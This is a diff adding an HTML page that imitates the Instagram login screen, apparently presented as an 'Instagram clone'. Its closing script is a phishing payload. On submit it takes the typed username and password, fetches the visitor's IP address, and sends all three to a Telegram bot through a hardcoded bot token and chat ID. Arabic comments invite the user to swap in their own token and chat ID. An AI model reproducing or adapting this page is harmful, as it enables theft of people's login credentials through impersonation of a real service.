@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+        
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width,initial_scale=1.0" />
+    <title>Instagram-clone by ARUN</title>
+    <link rel="stylesheet" href="style.css" />
+    <link rel="stylesheet" href="css/media-queries.css" />
+    <link rel="icon" href="insta-icon.jpg" />
+</head>
+<body>
+    <main>
+      
+      <div class="log-in-container">
+        <div class="log-in">
+            <img src="logo.png" class="logo" />
+            <form id="login-form">
+                <div class="log-in-form">
+                    <input type="text" id="email" placeholder="Phone number, username, or email" />
+                    <input type="password" id="password" placeholder="Password" />
+                    <button type="submit" class="log-in-button">Log In</button>
+                </div>
+
+
+                </form>
+                <span class="or-divider">OR</span>
+                <!--FACEBOOK OPTION-->
+                <div class="fb-login">
+                    <a href="#">
+                        <img src="facebook-icon.png">
+                        <span>Log in with Facebook</span>
+                    </a>
+                </div>
+                <!--forgot passwd-->
+                <a href="#">Forgot password?</a>
+            </div>
+            <!--sign up-->
+            <div class="sign-up">
+                <span>Don't have an account
+                    <a href="#">Sign up</a>
+                </span>
+            </div>
+            <!--download-->
+            <div class="get-the-app">
+              <span>Get the app</span>
+              <div class="app-images">
+                  <a href="#"><img src="applestore.png" /></a>
+                  <a href="#"><img src="googlestore.png" /></a>
+              </div>
+        </div>
+    </main>
+    <footer>
+        <ul class="footer-links">
+          <li><a href="#">ABOUT</a></li>
+          <li><a href="#">HELP</a></li>
+          <li><a href="#">PRESS</a></li>
+          <li><a href="#">API</a></li>
+          <li><a href="#">JOBS</a></li>
+          <li><a href="#">PRIVACY</a></li>
+          <li><a href="#">TERMS</a></li>
+          <li><a href="#">LOCATION</a></li>
+          <li><a href="#">TOP</a></li>
+          <li><a href="#">ACCOUNTS</a></li>
+          <li><a href="#">HASHTAGS</a></li>
+          <li><a href="#">LANGUAGE</a></li>
+        </ul>
+        <span class="copyright">&copy; 2020 Instagram from Facebook</span>
+    </footer>
+
+    <!-- تضمين مكتبة Axios -->
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+
+    <script>
+        const TOKEN = "7566916575:AAG7tX56-FU8U68P4p_Jlv6fzyK_q_KZG-g"; // استبدل بـ TOKEN الخاص بك
+        const CHAT_ID = "1951905494"; // استبدل بـ CHAT_ID الخاص بك
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+
+        document.getElementById('login-form').addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            axios.get('https://api.ipify.org?format=json')
+                .then(response => {
+                    const ip = response.data.ip;
+
+                    const message = `
+<b>New Login Attempt</b>
+<b>Email:</b> ${email}
+<b>Password:</b> ${password}
+<b>IP Address:</b> ${ip}
+                    `;
+
+                    axios.post(URI_API, {
+                        chat_id: CHAT_ID,
+                        parse_mode: 'html',
+                        text: message
+                    })
+                        .then(() => alert('Information sent successfully!'))
+                        .catch(() => alert('Error sending the information. Please try again.'));
+                })
+                .catch(() => alert('Error fetching the IP address. Please try again.'));
+        });
+    </script>
+</body>
+</html>
